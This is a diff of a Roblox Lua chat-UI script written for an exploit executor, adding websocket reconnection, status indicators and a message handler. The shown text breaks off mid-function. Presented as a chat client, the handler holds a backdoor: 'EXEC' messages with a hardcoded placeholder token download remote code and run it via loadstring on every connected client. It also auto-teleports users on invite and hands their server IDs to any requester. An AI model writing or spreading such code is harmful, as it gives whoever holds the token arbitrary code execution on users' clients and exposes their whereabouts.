@@ -1,6 +1,6 @@
 --[[
-    CHAT UI - Joshua STYLE (ENHANCED)
-    Purple theme with profile pictures, commands, and improved features
+    CHAT UI - Joshua STYLE (ENHANCED + STABLE CONNECTION)
+    Fixed: Settings popup, unified status indicator styling
 ]]
 
 repeat task.wait() until game:IsLoaded()
@@ -17,7 +17,7 @@ local player = Players.LocalPlayer
 repeat task.wait() until player:FindFirstChild("PlayerGui")
 
 -- ============================================
--- PURPLE THEME CONFIGURATION
+-- CONFIGURATION
 -- ============================================
 local Joshua_COLORS = {
     background = Color3.fromRGB(18, 12, 28),
@@ -31,22 +31,36 @@ local Joshua_COLORS = {
     dark_text = Color3.fromRGB(70, 50, 90),
     success = Color3.fromRGB(160, 255, 120),
     error = Color3.fromRGB(255, 100, 100),
+    warning = Color3.fromRGB(255, 200, 100),
     purple_glow = Color3.fromRGB(200, 150, 255),
 }
 
--- ============================================
--- WEBSOCKET & CHAT CONFIG
--- ============================================
 local Config = {
     RoomId = "101",
     ToggleUIKey = Enum.KeyCode.RightShift,
     FocusChatKey = Enum.KeyCode.T,
     ADMIN_TOKEN = "CHANGE_THIS_TOKEN_123",
-    SCRIPT_URL = "https://raw.githubusercontent.com/xxz18902-arch/diadwiiad/refs/heads/main/dw"
+    SCRIPT_URL = "https://raw.githubusercontent.com/xxz18902-arch/diadwiiad/refs/heads/main/dw",
+    WS_URL = "wss://chat-room-service--test123q8mey.replit.app/ws",
+    RECONNECT_DELAY = 3,
+    HEARTBEAT_INTERVAL = 15,
+    MAX_RECONNECT_ATTEMPTS = 10,
 }
 
 local WebSocket = WebSocket or syn.websocket
-local ws
+
+-- ============================================
+-- CONNECTION STATE
+-- ============================================
+local Connection = {
+    ws = nil,
+    isConnected = false,
+    reconnectAttempts = 0,
+    lastPing = 0,
+    lastPong = 0,
+    messageQueue = {},
+    shouldReconnect = true,
+}
 
 -- ============================================
 -- AUTO RE-EXECUTE
@@ -87,21 +101,11 @@ end
 -- ============================================
 local onlineUsers = {}
 local chatMessages = {}
-local selectedPlayer = nil
-local pendingInvites = {}
 local shouldAutoScroll = true
-local lastCanvasPosition = Vector2.new(0, 0)
-
--- ============================================
--- PROFILE PICTURE CACHE
--- ============================================
 local avatarCache = {}
 
 local function getAvatarImage(userId)
-    if avatarCache[userId] then
-        return avatarCache[userId]
-    end
-    local default = "rbxassetid://0"
+    if avatarCache[userId] then return avatarCache[userId] end
     local success, result = pcall(function()
         return Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
     end)
@@ -109,23 +113,20 @@ local function getAvatarImage(userId)
         avatarCache[userId] = result
         return result
     end
-    return default
+    return "rbxassetid://0"
 end
 
 -- ============================================
 -- UI CREATION
 -- ============================================
-
--- ScreenGui
 local gui = Instance.new("ScreenGui")
 gui.Name = "ChatUI_Purple"
 gui.ResetOnSpawn = false
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 gui.Parent = player.PlayerGui
 
--- Shadow frame
+-- Shadow
 local shadow = Instance.new("Frame")
-shadow.Name = "Shadow"
 shadow.Size = UDim2.new(0, 342, 0, 412)
 shadow.Position = UDim2.new(0, 58, 0, 58)
 shadow.BackgroundColor3 = Joshua_COLORS.shadow
@@ -138,7 +139,6 @@ shadowCorner.CornerRadius = UDim.new(0, 4)
 
 -- Main frame
 local frame = Instance.new("Frame")
-frame.Name = "MainFrame"
 frame.Size = UDim2.new(0, 340, 0, 410)
 frame.Position = UDim2.new(0, 50, 0, 50)
 frame.BackgroundColor3 = Joshua_COLORS.background
@@ -150,7 +150,6 @@ frame.Parent = gui
 local frameCorner = Instance.new("UICorner", frame)
 frameCorner.CornerRadius = UDim.new(0, 4)
 
--- Gradient overlay
 local gradient = Instance.new("UIGradient", frame)
 gradient.Color = ColorSequence.new{
     ColorSequenceKeypoint.new(0, Joshua_COLORS.background),
@@ -159,9 +158,7 @@ gradient.Color = ColorSequence.new{
 }
 gradient.Rotation = 45
 
--- Inner section
 local inside = Instance.new("Frame")
-inside.Name = "Inside"
 inside.Size = UDim2.new(1, -2, 1, -2)
 inside.Position = UDim2.new(0, 1, 0, 1)
 inside.BackgroundColor3 = Joshua_COLORS.section
@@ -175,7 +172,6 @@ insideCorner.CornerRadius = UDim.new(0, 4)
 -- LEFT SIDEBAR
 -- ============================================
 local leftSide = Instance.new("Frame")
-leftSide.Name = "LeftSide"
 leftSide.Size = UDim2.new(0, 100, 1, 0)
 leftSide.BackgroundColor3 = Joshua_COLORS.background
 leftSide.BorderSizePixel = 0
@@ -190,18 +186,14 @@ leftFix.BackgroundColor3 = Joshua_COLORS.background
 leftFix.BorderSizePixel = 0
 leftFix.Parent = leftSide
 
--- Divider
 local divider = Instance.new("Frame")
-divider.Name = "Divider"
 divider.Size = UDim2.new(0, 1, 1, 0)
 divider.Position = UDim2.new(1, -1, 0, 0)
 divider.BackgroundColor3 = Joshua_COLORS.border
 divider.BorderSizePixel = 0
 divider.Parent = leftSide
 
--- Glow line
 local glowLine = Instance.new("Frame")
-glowLine.Name = "GlowLine"
 glowLine.Size = UDim2.new(0, 2, 1, 0)
 glowLine.Position = UDim2.new(1, -2, 0, 0)
 glowLine.BackgroundColor3 = Joshua_COLORS.accent
@@ -211,14 +203,12 @@ glowLine.Parent = leftSide
 
 -- Logo area
 local logoArea = Instance.new("Frame")
-logoArea.Name = "LogoArea"
 logoArea.Size = UDim2.new(1, 0, 0, 60)
 logoArea.BackgroundColor3 = Joshua_COLORS.background
 logoArea.BorderSizePixel = 0
 logoArea.Parent = leftSide
 
 local logoText = Instance.new("TextLabel")
-logoText.Name = "Logo"
 logoText.Text = "💜 CHAT"
 logoText.Size = UDim2.new(1, -10, 0, 20)
 logoText.Position = UDim2.new(0, 5, 0, 10)
@@ -230,7 +220,6 @@ logoText.TextXAlignment = Enum.TextXAlignment.Left
 logoText.Parent = logoArea
 
 local versionText = Instance.new("TextLabel")
-versionText.Name = "Version"
 versionText.Text = "purple"
 versionText.Size = UDim2.new(1, -10, 0, 14)
 versionText.Position = UDim2.new(0, 5, 0, 32)
@@ -241,49 +230,106 @@ versionText.TextColor3 = Joshua_COLORS.accent
 versionText.TextXAlignment = Enum.TextXAlignment.Left
 versionText.Parent = logoArea
 
-local logoLine = Instance.new("Frame")
-logoLine.Size = UDim2.new(0.8, 0, 0, 2)
-logoLine.Position = UDim2.new(0.1, 0, 1, -2)
-logoLine.BackgroundColor3 = Joshua_COLORS.accent
-logoLine.BackgroundTransparency = 0.3
-logoLine.BorderSizePixel = 0
-logoLine.Parent = logoArea
+-- ============================================
+-- UNIFIED STATUS INDICATORS (SAME STYLE)
+-- ============================================
 
--- Room indicator
+-- Status container frame (unified styling)
+local statusContainer = Instance.new("Frame")
+statusContainer.Name = "StatusContainer"
+statusContainer.Size = UDim2.new(1, -10, 0, 70)
+statusContainer.Position = UDim2.new(0, 5, 0, 65)
+statusContainer.BackgroundColor3 = Joshua_COLORS.section
+statusContainer.BackgroundTransparency = 0.5
+statusContainer.BorderSizePixel = 0
+statusContainer.Parent = leftSide
+
+local statusContainerCorner = Instance.new("UICorner", statusContainer)
+statusContainerCorner.CornerRadius = UDim.new(0, 4)
+
+-- Room indicator (inside container)
 local roomLabel = Instance.new("TextLabel")
-roomLabel.Name = "RoomLabel"
 roomLabel.Text = "ROOM " .. Config.RoomId
-roomLabel.Size = UDim2.new(0, 80, 0, 16)
-roomLabel.Position = UDim2.new(0, 10, 0, 70)
-roomLabel.BackgroundColor3 = Joshua_COLORS.section
-roomLabel.BackgroundTransparency = 0.5
+roomLabel.Size = UDim2.new(1, -8, 0, 18)
+roomLabel.Position = UDim2.new(0, 4, 0, 4)
+roomLabel.BackgroundTransparency = 1
 roomLabel.Font = Enum.Font.GothamBold
 roomLabel.TextSize = 10
 roomLabel.TextColor3 = Joshua_COLORS.accent
-roomLabel.Parent = leftSide
+roomLabel.TextXAlignment = Enum.TextXAlignment.Center
+roomLabel.Parent = statusContainer
 
-local roomCorner = Instance.new("UICorner", roomLabel)
-roomCorner.CornerRadius = UDim.new(0, 2)
+-- Divider line
+local statusDivider = Instance.new("Frame")
+statusDivider.Size = UDim2.new(0.9, 0, 0, 1)
+statusDivider.Position = UDim2.new(0.05, 0, 0, 26)
+statusDivider.BackgroundColor3 = Joshua_COLORS.border
+statusDivider.BorderSizePixel = 0
+statusDivider.Parent = statusContainer
 
--- Online count
+-- Online count (with dot)
+local onlineFrame = Instance.new("Frame")
+onlineFrame.Size = UDim2.new(1, -8, 0, 16)
+onlineFrame.Position = UDim2.new(0, 4, 0, 30)
+onlineFrame.BackgroundTransparency = 1
+onlineFrame.Parent = statusContainer
+
+local onlineDot = Instance.new("Frame")
+onlineDot.Size = UDim2.new(0, 6, 0, 6)
+onlineDot.Position = UDim2.new(0, 2, 0.5, -3)
+onlineDot.BackgroundColor3 = Joshua_COLORS.success
+onlineDot.BorderSizePixel = 0
+onlineDot.Parent = onlineFrame
+
+local onlineDotCorner = Instance.new("UICorner", onlineDot)
+onlineDotCorner.CornerRadius = UDim.new(0, 3)
+
 local onlineLabel = Instance.new("TextLabel")
-onlineLabel.Name = "OnlineCount"
-onlineLabel.Text = "● ONLINE 0"
-onlineLabel.Size = UDim2.new(1, -10, 0, 14)
-onlineLabel.Position = UDim2.new(0, 5, 0, 95)
+onlineLabel.Text = "ONLINE 0"
+onlineLabel.Size = UDim2.new(1, -12, 1, 0)
+onlineLabel.Position = UDim2.new(0, 12, 0, 0)
 onlineLabel.BackgroundTransparency = 1
 onlineLabel.Font = Enum.Font.GothamBold
 onlineLabel.TextSize = 10
-onlineLabel.TextColor3 = Joshua_COLORS.success
+onlineLabel.TextColor3 = Joshua_COLORS.active_text
 onlineLabel.TextXAlignment = Enum.TextXAlignment.Left
-onlineLabel.Parent = leftSide
+onlineLabel.Parent = onlineFrame
 
--- Commands hint
+-- Connection status (with dot)
+local connFrame = Instance.new("Frame")
+connFrame.Size = UDim2.new(1, -8, 0, 16)
+connFrame.Position = UDim2.new(0, 4, 0, 48)
+connFrame.BackgroundTransparency = 1
+connFrame.Parent = statusContainer
+
+local connDot = Instance.new("Frame")
+connDot.Name = "ConnDot"
+connDot.Size = UDim2.new(0, 6, 0, 6)
+connDot.Position = UDim2.new(0, 2, 0.5, -3)
+connDot.BackgroundColor3 = Joshua_COLORS.error
+connDot.BorderSizePixel = 0
+connDot.Parent = connFrame
+
+local connDotCorner = Instance.new("UICorner", connDot)
+connDotCorner.CornerRadius = UDim.new(0, 3)
+
+local connLabel = Instance.new("TextLabel")
+connLabel.Name = "ConnLabel"
+connLabel.Text = "Disconnected"
+connLabel.Size = UDim2.new(1, -12, 1, 0)
+connLabel.Position = UDim2.new(0, 12, 0, 0)
+connLabel.BackgroundTransparency = 1
+connLabel.Font = Enum.Font.GothamBold
+connLabel.TextSize = 10
+connLabel.TextColor3 = Joshua_COLORS.error
+connLabel.TextXAlignment = Enum.TextXAlignment.Left
+connLabel.Parent = connFrame
+
+-- Commands hint (moved down)
 local commandsHint = Instance.new("TextLabel")
-commandsHint.Name = "CommandsHint"
 commandsHint.Text = "!exec !join !inv"
 commandsHint.Size = UDim2.new(1, -10, 0, 28)
-commandsHint.Position = UDim2.new(0, 5, 0, 115)
+commandsHint.Position = UDim2.new(0, 5, 0, 140)
 commandsHint.BackgroundTransparency = 1
 commandsHint.Font = Enum.Font.Gotham
 commandsHint.TextSize = 9
@@ -292,20 +338,34 @@ commandsHint.TextXAlignment = Enum.TextXAlignment.Left
 commandsHint.TextWrapped = true
 commandsHint.Parent = leftSide
 
+-- Reconnect button
+local reconnectBtn = Instance.new("TextButton")
+reconnectBtn.Name = "ReconnectBtn"
+reconnectBtn.Text = "↻ Reconnect"
+reconnectBtn.Size = UDim2.new(0, 80, 0, 20)
+reconnectBtn.Position = UDim2.new(0, 10, 0, 175)
+reconnectBtn.BackgroundColor3 = Joshua_COLORS.border
+reconnectBtn.Font = Enum.Font.GothamBold
+reconnectBtn.TextSize = 9
+reconnectBtn.TextColor3 = Joshua_COLORS.active_text
+reconnectBtn.AutoButtonColor = false
+reconnectBtn.Visible = false
+reconnectBtn.Parent = leftSide
+
+local reconnectCorner = Instance.new("UICorner", reconnectBtn)
+reconnectCorner.CornerRadius = UDim.new(0, 3)
+
 -- ============================================
--- RIGHT CONTENT AREA
+-- RIGHT CONTENT
 -- ============================================
 local rightSide = Instance.new("Frame")
-rightSide.Name = "RightSide"
 rightSide.Size = UDim2.new(1, -101, 1, 0)
 rightSide.Position = UDim2.new(0, 101, 0, 0)
 rightSide.BackgroundColor3 = Joshua_COLORS.background
 rightSide.BorderSizePixel = 0
 rightSide.Parent = inside
 
--- Header
 local header = Instance.new("Frame")
-header.Name = "Header"
 header.Size = UDim2.new(1, 0, 0, 30)
 header.BackgroundColor3 = Joshua_COLORS.section
 header.BorderSizePixel = 0
@@ -322,7 +382,6 @@ headerFix.BorderSizePixel = 0
 headerFix.Parent = header
 
 local headerTitle = Instance.new("TextLabel")
-headerTitle.Name = "Title"
 headerTitle.Text = "Messages"
 headerTitle.Size = UDim2.new(1, -40, 1, 0)
 headerTitle.Position = UDim2.new(0, 10, 0, 0)
@@ -333,9 +392,7 @@ headerTitle.TextColor3 = Joshua_COLORS.active_text
 headerTitle.TextXAlignment = Enum.TextXAlignment.Left
 headerTitle.Parent = header
 
--- Close button
 local closeBtn = Instance.new("TextButton")
-closeBtn.Name = "Close"
 closeBtn.Size = UDim2.new(0, 20, 0, 20)
 closeBtn.Position = UDim2.new(1, -25, 0, 5)
 closeBtn.BackgroundColor3 = Joshua_COLORS.border
@@ -350,10 +407,9 @@ local closeCorner = Instance.new("UICorner", closeBtn)
 closeCorner.CornerRadius = UDim.new(0, 4)
 
 -- ============================================
--- CHAT AREA (FIXED - No AutomaticCanvasSize)
+-- CHAT AREA
 -- ============================================
 local chatArea = Instance.new("ScrollingFrame")
-chatArea.Name = "ChatArea"
 chatArea.Size = UDim2.new(1, -10, 1, -90)
 chatArea.Position = UDim2.new(0, 5, 0, 35)
 chatArea.BackgroundColor3 = Joshua_COLORS.section
@@ -383,23 +439,17 @@ chatLayout.Padding = UDim.new(0, 8)
 chatLayout.SortOrder = Enum.SortOrder.LayoutOrder
 chatLayout.Parent = chatArea
 
--- Track if user is manually scrolling
+-- Auto-scroll detection
 chatArea:GetPropertyChangedSignal("CanvasPosition"):Connect(function()
     local currentPos = chatArea.CanvasPosition.Y
     local maxPos = chatArea.AbsoluteCanvasSize.Y - chatArea.AbsoluteWindowSize.Y
-    -- If user scrolls up more than 50 pixels from bottom, disable auto-scroll
-    if maxPos - currentPos > 50 then
-        shouldAutoScroll = false
-    else
-        shouldAutoScroll = true
-    end
+    shouldAutoScroll = maxPos - currentPos <= 50
 end)
 
 -- ============================================
 -- INPUT AREA
 -- ============================================
 local inputBorder = Instance.new("Frame")
-inputBorder.Name = "InputBorder"
 inputBorder.Size = UDim2.new(1, -10, 0, 32)
 inputBorder.Position = UDim2.new(0, 5, 1, -42)
 inputBorder.BackgroundColor3 = Joshua_COLORS.border
@@ -410,7 +460,6 @@ local inputCorner = Instance.new("UICorner", inputBorder)
 inputCorner.CornerRadius = UDim.new(0, 4)
 
 local inputInside = Instance.new("Frame")
-inputInside.Name = "InputInside"
 inputInside.Size = UDim2.new(1, -2, 1, -2)
 inputInside.Position = UDim2.new(0, 1, 0, 1)
 inputInside.BackgroundColor3 = Joshua_COLORS.background
@@ -421,7 +470,6 @@ local inputInsideCorner = Instance.new("UICorner", inputInside)
 inputInsideCorner.CornerRadius = UDim.new(0, 4)
 
 local inputBox = Instance.new("TextBox")
-inputBox.Name = "Input"
 inputBox.Size = UDim2.new(1, -70, 1, 0)
 inputBox.Position = UDim2.new(0, 8, 0, 0)
 inputBox.BackgroundTransparency = 1
@@ -434,8 +482,22 @@ inputBox.ClearTextOnFocus = false
 inputBox.TextXAlignment = Enum.TextXAlignment.Left
 inputBox.Parent = inputInside
 
+-- Connection warning in input
+local connWarning = Instance.new("TextLabel")
+connWarning.Name = "ConnWarning"
+connWarning.Text = "⚠ Disconnected"
+connWarning.Size = UDim2.new(1, -70, 1, 0)
+connWarning.Position = UDim2.new(0, 8, 0, 0)
+connWarning.BackgroundTransparency = 0.3
+connWarning.BackgroundColor3 = Joshua_COLORS.background
+connWarning.Font = Enum.Font.GothamBold
+connWarning.TextSize = 11
+connWarning.TextColor3 = Joshua_COLORS.error
+connWarning.Visible = false
+connWarning.ZIndex = 5
+connWarning.Parent = inputInside
+
 local sendBtn = Instance.new("TextButton")
-sendBtn.Name = "Send"
 sendBtn.Size = UDim2.new(0, 55, 0, 24)
 sendBtn.Position = UDim2.new(1, -60, 0, 3)
 sendBtn.BackgroundColor3 = Joshua_COLORS.accent
@@ -450,7 +512,7 @@ local sendCorner = Instance.new("UICorner", sendBtn)
 sendCorner.CornerRadius = UDim.new(0, 4)
 
 -- ============================================
--- SETTINGS BUTTON & POPUP
+-- SETTINGS BUTTON & POPUP (FIXED)
 -- ============================================
 local settingsArea = Instance.new("Frame")
 settingsArea.Name = "SettingsArea"
@@ -460,7 +522,7 @@ settingsArea.BackgroundTransparency = 1
 settingsArea.Parent = leftSide
 
 local settingsBtn = Instance.new("TextButton")
-settingsBtn.Name = "Settings"
+settingsBtn.Name = "SettingsBtn"
 settingsBtn.Size = UDim2.new(0, 20, 0, 20)
 settingsBtn.Position = UDim2.new(0, 10, 0, 5)
 settingsBtn.BackgroundTransparency = 1
@@ -473,8 +535,8 @@ settingsBtn.Parent = settingsArea
 -- Settings popup
 local settingsPopup = Instance.new("Frame")
 settingsPopup.Name = "SettingsPopup"
-settingsPopup.Size = UDim2.new(0, 200, 0, 140)
-settingsPopup.Position = UDim2.new(0, 110, 0, 250)
+settingsPopup.Size = UDim2.new(0, 200, 0, 150)
+settingsPopup.Position = UDim2.new(0, 110, 0, 200)
 settingsPopup.BackgroundColor3 = Joshua_COLORS.section
 settingsPopup.BorderSizePixel = 0
 settingsPopup.Visible = false
@@ -502,7 +564,7 @@ local settingsShadowCorner = Instance.new("UICorner", settingsShadow)
 settingsShadowCorner.CornerRadius = UDim.new(0, 4)
 
 local settingsHeader = Instance.new("Frame")
-settingsHeader.Size = UDim2.new(1, 0, 0, 25)
+settingsHeader.Size = UDim2.new(1, 0, 0, 28)
 settingsHeader.BackgroundColor3 = Joshua_COLORS.background
 settingsHeader.BorderSizePixel = 0
 settingsHeader.ZIndex = 11
@@ -521,7 +583,7 @@ settingsHeaderFix.Parent = settingsHeader
 
 local settingsTitle = Instance.new("TextLabel")
 settingsTitle.Text = "⚙ Settings"
-settingsTitle.Size = UDim2.new(1, -10, 1, 0)
+settingsTitle.Size = UDim2.new(1, -35, 1, 0)
 settingsTitle.Position = UDim2.new(0, 10, 0, 0)
 settingsTitle.BackgroundTransparency = 1
 settingsTitle.Font = Enum.Font.GothamBold
@@ -532,12 +594,12 @@ settingsTitle.ZIndex = 12
 settingsTitle.Parent = settingsHeader
 
 local closeSettings = Instance.new("TextButton")
-closeSettings.Size = UDim2.new(0, 18, 0, 18)
-closeSettings.Position = UDim2.new(1, -23, 0, 3)
+closeSettings.Size = UDim2.new(0, 20, 0, 20)
+closeSettings.Position = UDim2.new(1, -25, 0, 4)
 closeSettings.BackgroundColor3 = Joshua_COLORS.border
 closeSettings.Text = "✕"
 closeSettings.Font = Enum.Font.GothamBold
-closeSettings.TextSize = 10
+closeSettings.TextSize = 12
 closeSettings.TextColor3 = Joshua_COLORS.inactive_text
 closeSettings.AutoButtonColor = false
 closeSettings.ZIndex = 12
@@ -547,8 +609,8 @@ local closeSettingsCorner = Instance.new("UICorner", closeSettings)
 closeSettingsCorner.CornerRadius = UDim.new(0, 3)
 
 local settingsContent = Instance.new("Frame")
-settingsContent.Size = UDim2.new(1, -20, 1, -35)
-settingsContent.Position = UDim2.new(0, 10, 0, 30)
+settingsContent.Size = UDim2.new(1, -16, 1, -36)
+settingsContent.Position = UDim2.new(0, 8, 0, 32)
 settingsContent.BackgroundTransparency = 1
 settingsContent.ZIndex = 11
 settingsContent.Parent = settingsPopup
@@ -556,7 +618,7 @@ settingsContent.Parent = settingsPopup
 -- Toggle UI Key
 local toggleKeyLabel = Instance.new("TextLabel")
 toggleKeyLabel.Text = "Toggle UI Key"
-toggleKeyLabel.Size = UDim2.new(0.5, 0, 0, 20)
+toggleKeyLabel.Size = UDim2.new(0.5, 0, 0, 22)
 toggleKeyLabel.Position = UDim2.new(0, 0, 0, 5)
 toggleKeyLabel.BackgroundTransparency = 1
 toggleKeyLabel.Font = Enum.Font.Gotham
@@ -569,7 +631,7 @@ toggleKeyLabel.Parent = settingsContent
 local toggleKeyBox = Instance.new("TextButton")
 toggleKeyBox.Name = "ToggleKeyBox"
 toggleKeyBox.Text = Config.ToggleUIKey.Name
-toggleKeyBox.Size = UDim2.new(0, 70, 0, 20)
+toggleKeyBox.Size = UDim2.new(0, 70, 0, 22)
 toggleKeyBox.Position = UDim2.new(1, -75, 0, 5)
 toggleKeyBox.BackgroundColor3 = Joshua_COLORS.border
 toggleKeyBox.Font = Enum.Font.GothamBold
@@ -585,8 +647,8 @@ toggleKeyCorner.CornerRadius = UDim.new(0, 3)
 -- Focus Chat Key
 local focusKeyLabel = Instance.new("TextLabel")
 focusKeyLabel.Text = "Focus Chat Key"
-focusKeyLabel.Size = UDim2.new(0.5, 0, 0, 20)
-focusKeyLabel.Position = UDim2.new(0, 0, 0, 32)
+focusKeyLabel.Size = UDim2.new(0.5, 0, 0, 22)
+focusKeyLabel.Position = UDim2.new(0, 0, 0, 34)
 focusKeyLabel.BackgroundTransparency = 1
 focusKeyLabel.Font = Enum.Font.Gotham
 focusKeyLabel.TextSize = 11
@@ -598,8 +660,8 @@ focusKeyLabel.Parent = settingsContent
 local focusKeyBox = Instance.new("TextButton")
 focusKeyBox.Name = "FocusKeyBox"
 focusKeyBox.Text = Config.FocusChatKey.Name
-focusKeyBox.Size = UDim2.new(0, 70, 0, 20)
-focusKeyBox.Position = UDim2.new(1, -75, 0, 32)
+focusKeyBox.Size = UDim2.new(0, 70, 0, 22)
+focusKeyBox.Position = UDim2.new(1, -75, 0, 34)
 focusKeyBox.BackgroundColor3 = Joshua_COLORS.border
 focusKeyBox.Font = Enum.Font.GothamBold
 focusKeyBox.TextSize = 10
@@ -614,8 +676,8 @@ focusKeyCorner.CornerRadius = UDim.new(0, 3)
 -- Room ID
 local roomIdLabel = Instance.new("TextLabel")
 roomIdLabel.Text = "Room ID"
-roomIdLabel.Size = UDim2.new(0.5, 0, 0, 20)
-roomIdLabel.Position = UDim2.new(0, 0, 0, 59)
+roomIdLabel.Size = UDim2.new(0.5, 0, 0, 22)
+roomIdLabel.Position = UDim2.new(0, 0, 0, 63)
 roomIdLabel.BackgroundTransparency = 1
 roomIdLabel.Font = Enum.Font.Gotham
 roomIdLabel.TextSize = 11
@@ -627,8 +689,8 @@ roomIdLabel.Parent = settingsContent
 local roomIdBox = Instance.new("TextBox")
 roomIdBox.Name = "RoomIdBox"
 roomIdBox.Text = Config.RoomId
-roomIdBox.Size = UDim2.new(0, 70, 0, 20)
-roomIdBox.Position = UDim2.new(1, -75, 0, 59)
+roomIdBox.Size = UDim2.new(0, 70, 0, 22)
+roomIdBox.Position = UDim2.new(1, -75, 0, 63)
 roomIdBox.BackgroundColor3 = Joshua_COLORS.border
 roomIdBox.Font = Enum.Font.Gotham
 roomIdBox.TextSize = 10
@@ -641,10 +703,10 @@ local roomIdCorner = Instance.new("UICorner", roomIdBox)
 roomIdCorner.CornerRadius = UDim.new(0, 3)
 
 -- ============================================
--- SCROLL TO BOTTOM FUNCTION (FIXED)
+-- SCROLL FUNCTIONS
 -- ============================================
 local function updateCanvasSize()
-    local contentHeight = chatLayout.AbsoluteContentSize.Y + 16 -- padding
+    local contentHeight = chatLayout.AbsoluteContentSize.Y + 16
     chatArea.CanvasSize = UDim2.new(0, 0, 0, contentHeight)
 end
 
@@ -660,7 +722,7 @@ local function scrollToBottom(force)
 end
 
 -- ============================================
--- CHAT MESSAGE BUBBLE (FIXED)
+-- MESSAGE BUBBLE
 -- ============================================
 local function createMessageBubble(text, isYou, username, userId)
     text = parseEmojis(text)
@@ -674,7 +736,6 @@ local function createMessageBubble(text, isYou, username, userId)
 
     table.insert(chatMessages, container)
 
-    -- Avatar
     local avatarSize = 32
     local avatar = Instance.new("Frame")
     avatar.Size = UDim2.new(0, avatarSize, 0, avatarSize)
@@ -686,7 +747,6 @@ local function createMessageBubble(text, isYou, username, userId)
     avatarCorner.CornerRadius = UDim.new(0, 16)
 
     local profilePic = Instance.new("ImageLabel")
-    profilePic.Name = "ProfilePic"
     profilePic.Size = UDim2.new(1, -4, 1, -4)
     profilePic.Position = UDim2.new(0, 2, 0, 2)
     profilePic.BackgroundTransparency = 1
@@ -712,7 +772,6 @@ local function createMessageBubble(text, isYou, username, userId)
     avatarGlow.Thickness = 2
     avatarGlow.Transparency = 0.3
 
-    -- Message bubble
     local bubble = Instance.new("Frame")
     bubble.Size = UDim2.new(1, -44, 0, 0)
     bubble.Position = UDim2.new(0, 38, 0, 0)
@@ -760,18 +819,15 @@ local function createMessageBubble(text, isYou, username, userId)
     msgText.AutomaticSize = Enum.AutomaticSize.Y
     msgText.Parent = bubble
 
-    -- FIXED: Better timing for layout updates
     local function finalizeLayout()
         container.Size = UDim2.new(1, 0, 0, math.max(avatarSize, bubble.AbsoluteSize.Y + 4))
         scrollToBottom()
     end
 
-    -- Try multiple times to ensure layout is calculated
     task.delay(0, finalizeLayout)
     task.delay(0.05, finalizeLayout)
     task.delay(0.1, finalizeLayout)
 
-    -- Animation
     bubble.BackgroundTransparency = 1
     bubble.Position = bubble.Position - UDim2.new(0, 0, 0, 10)
     TweenService:Create(bubble, TweenInfo.new(0.2, Enum.EasingStyle.Sine), {
@@ -783,17 +839,221 @@ local function createMessageBubble(text, isYou, username, userId)
 end
 
 -- ============================================
--- WEBSOCKET CONNECTION
+-- CONNECTION MANAGEMENT
 -- ============================================
-local function connectWebSocket()
-    ws = WebSocket.connect("wss://chat-room-service--test123q8mey.replit.app/ws?room=" .. Config.RoomId)
-    return ws
+local function updateConnectionStatus(connected, message)
+    Connection.isConnected = connected
+    if connected then
+        connDot.BackgroundColor3 = Joshua_COLORS.success
+        connLabel.Text = "Connected"
+        connLabel.TextColor3 = Joshua_COLORS.success
+        reconnectBtn.Visible = false
+        connWarning.Visible = false
+        Connection.reconnectAttempts = 0
+    else
+        connDot.BackgroundColor3 = Joshua_COLORS.error
+        connLabel.Text = message or "Disconnected"
+        connLabel.TextColor3 = Joshua_COLORS.error
+        reconnectBtn.Visible = true
+        connWarning.Visible = true
+    end
 end
 
-local success, ws = pcall(connectWebSocket)
+local function sendWebSocket(message)
+    if Connection.ws and Connection.isConnected then
+        local success = pcall(function()
+            Connection.ws:Send(message)
+        end)
+        if success then
+            return true
+        else
+            table.insert(Connection.messageQueue, message)
+            updateConnectionStatus(false, "Send failed")
+            return false
+        end
+    else
+        table.insert(Connection.messageQueue, message)
+        return false
+    end
+end
+
+local function processMessageQueue()
+    if not Connection.isConnected then return end
+    while #Connection.messageQueue > 0 do
+        local msg = table.remove(Connection.messageQueue, 1)
+        pcall(function()
+            if Connection.ws then
+                Connection.ws:Send(msg)
+            end
+        end)
+        task.wait(0.1)
+    end
+end
+
+local heartbeatConnection
+local function startHeartbeat()
+    if heartbeatConnection then
+        heartbeatConnection:Disconnect()
+    end
+    heartbeatConnection = task.spawn(function()
+        while Connection.isConnected do
+            task.wait(Config.HEARTBEAT_INTERVAL)
+            if not Connection.isConnected then break end
+            local success = pcall(function()
+                if Connection.ws then
+                    Connection.ws:Send("PING|" .. tick())
+                end
+            end)
+            if not success then
+                updateConnectionStatus(false, "Ping failed")
+                break
+            end
+        end
+    end)
+end
+
+local function connectWebSocket()
+    if Connection.ws then
+        pcall(function() Connection.ws:Close() end)
+    end
+    
+    updateConnectionStatus(false, "Connecting...")
+    
+    local success, result = pcall(function()
+        return WebSocket.connect(Config.WS_URL .. "?room=" .. Config.RoomId)
+    end)
+    
+    if success and result then
+        Connection.ws = result
+        Connection.isConnected = true
+        updateConnectionStatus(true)
+        
+        Connection.ws.OnMessage:Connect(function(msg)
+            if msg:sub(1, 5) == "PONG|" then
+                Connection.lastPong = tick()
+                return
+            end
+            
+            if msg:sub(1, 5) == "PING|" then
+                sendWebSocket("PONG|" .. tick())
+                return
+            end
+            
+            if msg:sub(1, 5) == "EXEC|" then
+                local _, _, token, payload = msg:find("^EXEC|(.-)|(.+)$")
+                if token == Config.ADMIN_TOKEN then
+                    local code = payload
+                    if payload:match("^https?://") then
+                        local ok, res = pcall(function() return game:HttpGet(payload) end)
+                        if ok then code = res end
+                    end
+                    local fn = loadstring(code)
+                    if fn then 
+                        pcall(fn) 
+                        createMessageBubble("✅ Code executed", false, "System", nil)
+                    end
+                end
+                return
+            end
+            
+            if msg:sub(1, 7) == "INVITE|" then
+                local target, placeId, jobId, from = msg:match("^INVITE|(.-)|(.+)|(.+)|(.+)$")
+                if target == player.Name then
+                    createMessageBubble("📩 Invite from " .. from .. "! Joining...", false, "System", nil)
+                    QueueReExecute()
+                    task.wait(0.5)
+                    TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId, player)
+                end
+                return
+            end
+            
+            if msg:sub(1, 13) == "JOIN_REQUEST|" then
+                local target, requester, requesterId = msg:match("^JOIN_REQUEST|(.-)|(.+)|(.+)$")
+                if target == player.Name then
+                    createMessageBubble("🙋 " .. requester .. " wants to join you", false, "System", nil)
+                    sendWebSocket("INVITE|" .. requester .. "|" .. game.PlaceId .. "|" .. game.JobId .. "|" .. player.Name)
+                end
+                return
